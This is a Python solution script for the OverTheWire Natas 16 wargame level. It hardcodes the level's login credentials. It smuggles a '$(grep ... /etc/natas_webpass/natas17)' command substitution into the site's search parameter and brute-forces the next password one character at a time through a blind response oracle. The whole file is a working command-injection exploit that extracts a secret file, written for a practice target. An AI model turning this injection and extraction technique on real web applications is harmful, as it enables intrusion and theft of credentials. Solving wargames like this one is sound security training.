#!/usr/bin/python

import requests

natas16_user = 'natas16'
natas16_pass = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

dummy_word = 'zigzagged'

def make_post(test_word):
    url = 'http://natas16.natas.labs.overthewire.org/?debug=true&needle=' + test_word
    r = requests.get(url, auth=(natas16_user, natas16_pass))
    if r.content.find(dummy_word) == -1:
        return True
    return False

dictionary = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
current_pass = ''

for i in range(0, 64):
    for c in dictionary:
        test_pass = current_pass + c
        test_word = '$(grep -E \^' + test_pass + ' /etc/natas_webpass/natas17)' + dummy_word
        result = make_post(test_word)
        #print("Testing: " + test_word)
        if result:
            current_pass = test_pass
            print("Password detected so far: " + current_pass)
            break
print("Password found: " + current_pass)
